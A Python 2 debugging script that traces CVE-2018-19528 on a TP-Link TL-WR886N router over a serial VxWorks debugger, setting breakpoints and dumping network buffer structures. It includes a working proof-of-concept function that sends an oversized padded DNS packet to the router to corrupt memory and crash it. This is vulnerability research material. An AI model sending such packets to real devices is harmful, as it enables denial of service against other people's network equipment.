# !/usr/bin/env python2
# coding=utf-8
from serial_debuger.vx5_mips_debugger import *
from serial_debuger.serialtube import serialtube
import logging
import socket
import time

serial_port = "/dev/tty.usbserial-AI069JDS"
debugger = Vx5MipsDebugger()
debugger.serial = serialtube(port=serial_port)
# debugger.logger.setLevel(logging.DEBUG)
debugger.init_debugger(0x800A88A4)

########################
# Debug CVE-2018-19528 #
########################
print("This script is used to debug CVE-2018-19528 vulnerability.")
print("Target Device: TL-WR886N\r\nHardware Version: V7\r\nFirmware Version: V1.1.0")


# Send poc to target
def send_poc(target_address):
    host = target_address
    port = 53
    dns_request_packet = 'cb63010000010000000000000774706c6f67696e02636e0000010001'.decode('hex')
    # Make packet Bigger than MTU
    poc = dns_request_packet + 'A' * (1480 - len(dns_request_packet))
    # Add more data to packet
    poc += 'ABC\x20' * 100
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((host, port))
    sock.send(poc)


# Before modify mblk
def call_back_801532B0(debugger, task, break_point):
    debugger.logger.info("Hit condition breakpoint at 0x801532B0")
    flag = True
    # Get s7 register value(Mblk pointer).
    s7 = int(debugger.current_task_regs[task]['s7'], 16)
    print("{:-^{width}}".format('condition(mblk)', width=80))
    print('##mBlkHdr at %s' % hex(s7))
    mblk_hdr_data = debugger.get_mem_dump(s7, 0x30)
    mblk_hdr = mBlkHdr(mblk_hdr_data)
    mblk_hdr.show()
    print('##mData')
    # Get mblk mData
    mData = debugger.get_mem_dump(mblk_hdr.mData, 0x100)
    # Parser Data in mblk
    if mData[:2] == '\x45\x00':
        mPacket = IP(mData)
    elif mData[:2] == '\x41\x41':
        mPacket = Raw(mData)
    else:
        mPacket = Ether(mData)
        flag = False
    # Print packet data
    mPacket.show()
    print('Raw mData: %s' % mData.encode('hex'))
    # Get clblk data
    clblk_hdr_addr = struct.unpack('!I', debugger.get_mem_dump(s7 + 0x30, 0x04))[0]
    clblk_hdr_data = debugger.get_mem_dump(clblk_hdr_addr, 0x30)
    clBlk_hdr = clBlk(clblk_hdr_data)
    # Print the clBlk Structs
    clBlk_hdr.show()
    return flag


debugger.add_break_point(bp_address=0x801532B0, condition=call_back_801532B0)


# Afrer modify mblk
def call_back_8015345C(debugger, task, break_point):
    debugger.logger.info("Hit condition breakpoint at 0x8015345C")
    flag = True
    # Get a0 register value(Mblk pointer).
    a0 = int(debugger.current_task_regs[task]['a0'], 16)
    print("{:-^{width}}".format('condition(mblk)', width=80))
    print('##mBlkHdr at %s' % hex(a0))
    mblk_hdr_data = debugger.get_mem_dump(a0, 0x30)
    mblk_hdr = mBlkHdr(mblk_hdr_data)
    mblk_hdr.show()
    print('##mData')
    # Get mblk mData
    mData = debugger.get_mem_dump(mblk_hdr.mData, 0x100)
    # Parser Data in mblk
    if mData[:2] == '\x45\x00':
        mPacket = IP(mData)
    elif mData[:2] == '\x41\x41':
        mPacket = Raw(mData)
    else:
        mPacket = Ether(mData)
        flag = False
    # Print packet data
    mPacket.show()
    print('Raw mData: %s' % mData.encode('hex'))
    # Get clblk data
    clblk_hdr_addr = struct.unpack('!I', debugger.get_mem_dump(a0 + 0x30, 0x04))[0]
    clblk_hdr_data = debugger.get_mem_dump(clblk_hdr_addr, 0x30)
    clBlk_hdr = clBlk(clblk_hdr_data)
    # Print the clBlk Structs
    clBlk_hdr.show()
    return flag


debugger.add_break_point(bp_address=0x8015345C, condition=call_back_8015345C)


def wait_move_on(print_string):
    print(print_string)
    move_on = False
    while move_on is False:
        ans = raw_input("Y/y to move on,\n:")
        if ans.upper() == "Y":
            move_on = True
    return


# Send poc to target
time.sleep(2)  # Wait 2 seconds
print("Sending poc to target")
send_poc("192.168.1.1")


# Wait break
print("Wait target break at 0x801532B0")
task = debugger.wait_break()
wait_move_on("Now we break at 0x801532B0, s7 register value is mblk pointer")


print("Resume task, Wait target break at 0x8015345C")
debugger.task_resume(task)
wait_move_on("Now we break at 0x8015345C, a0 register value is mblk pointer, data in mblk has be modified.")

print("Add break point at 0x800AA7E4, call netTupleGet")
debugger.add_break_point(0x800AA7E4)
print("Resume task, Wait target break at 0x800AA7E4")
debugger.task_resume(task)
request_buff_size = int(debugger.current_task_regs[task]['a1'], 16)
print("Request buff size is: %s" % hex(request_buff_size))
wait_move_on("Now we break at 0x800AA7E4(call netTupleGet), a1 register value is request buff size.")


print("Add break point at 0x800AA810, call netMblkToBufCopy")
debugger.add_break_point(0x800AA810)
print("Resume task, Wait target break at 0x800AA810")
debugger.task_resume(task)
rsp_mblk = int(debugger.current_task_regs[task]['s0'], 16)
print("netTupleGet returned mblk object address is: %s" % hex(rsp_mblk))
debugger.get_mblk_info(rsp_mblk)
dst_address = int(debugger.current_task_regs[task]['a1'], 16)
print("netMblkToBufCopy destination buff address is: %s" % hex(dst_address))
print("{:-^{width}}".format('Destination data before copy', width=80))
print(debugger.send_and_recvuntil("mem -dump %s %s" % (hex(dst_address), 0x100)))
wait_move_on("Now we break at 0x800AA7F8(after call netTupleGet), s0 register value: %s is returned mblk object,\r\n "
             "a1 register value: %s is destination buff address" % (hex(rsp_mblk), hex(dst_address)))


print("Add break point at 0x800AA860, after call netMblkToBufCopy")
debugger.add_break_point(0x800AA860)
print("Resume task, Wait target break at 0x800AA860")
debugger.task_resume(task)
print("{:-^{width}}".format('Destination data after copy', width=80))
print(debugger.send_and_recvuntil("mem -dump %s %s" % (hex(dst_address), 0x100)))
wait_move_on("cluster poll data has be overwritten, this will cause some random crash.")
debugger.task_resume(task)

